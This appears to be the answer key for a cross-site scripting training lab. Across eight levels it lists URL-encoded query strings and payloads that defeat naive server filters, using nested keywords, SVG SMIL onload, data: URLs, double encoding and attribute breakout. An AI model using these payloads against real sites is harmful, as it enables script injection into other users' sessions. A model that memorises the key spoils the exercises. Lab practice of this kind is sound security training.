# encoding-bypass — solutions

Server filter strategies bypassable via case mix, double-encoding, alternative tags, etc.

### encoding-bypass-level1

`/encoding-bypass/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: recursively strips `script` — use any other tag with handler

### encoding-bypass-level2

`/encoding-bypass/level2/?query=%3C%3Cscript%3E%3Escript%3Ealert(1)%3C/script%3E`

- payload: `<<script>>script>alert(1)</script>`
- context: only first `<` and first `>` stripped — duplicate them

### encoding-bypass-level3

`/encoding-bypass/level3/?query=%3Cimg%20src=x%20onerror=alalertert(1)%3E`

- payload: `<img src=x onerror=alalertert(1)>`
- context: non-recursive `alert` strip — nest the keyword so one pass leaves `alert`

### encoding-bypass-level4

`/encoding-bypass/level4/?query=%3Csvg%3E%3Cset%20attributeName=onload%20to=alert(1)%3E%3Canimate%20begin=0s%3E%3C/svg%3E`

- payload: `<svg><set attributeName=onload to=alert(1)><animate begin=0s></svg>`
- context: strips `on\w+=` attributes; use SVG SMIL `<set>` to assign onload via attributeName

### encoding-bypass-level5

`/encoding-bypass/level5/?query=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `data:text/html,<script>alert(1)</script>`
- context: `javascript:` stripped; reflected in `<a href="...">` — use data: URL

### encoding-bypass-level6

`/encoding-bypass/level6/?query=%253Cscript%253Ealert(1)%253C/script%253E`

- payload: `%3Cscript%3Ealert(1)%3C/script%3E`
- context: server URL-decodes once then strips raw `<>`; double-encode to deliver after strip

### encoding-bypass-level7

`/encoding-bypass/level7/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: whitelist allows img/div/span — use img with onerror

### encoding-bypass-level8

`/encoding-bypass/level8/?query=%22%20onfocus=alert(1)%20autofocus%20x`

- payload: `" onfocus=alert(1) autofocus x`
- context: inside `<div class="...">`; 60-char limit but no quote escape — break with `"`
